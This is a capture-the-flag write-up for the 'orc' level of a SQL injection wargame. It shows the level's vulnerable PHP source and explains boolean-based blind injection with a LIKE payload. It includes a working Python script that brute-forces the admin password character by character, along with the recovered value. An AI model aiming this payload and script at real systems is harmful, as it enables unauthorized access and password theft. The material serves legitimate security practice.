# orc

----------

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

Here we have to use blind injection to find the real password and input it to complete the level. Here we can use boolean based blind injection by giving pw value `' or pw like '{}%` and checking with each character.

So I made script for that :

```python
import requests
import string

session=requests.Session()

url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=' or pw like '{}%"
cookies={"PHPSESSID":"t2olebiumhrkeldqqkd0g2c5q0"}
pw=""
for j in range(10):
    for i in string.printable:
        r=requests.get(url.format(pw+i),cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw+=i
            print("Password :",pw)
            break
print("Password :", pw)
```

it gave the password as `095a9852` and giving that as the value of pw solved the level
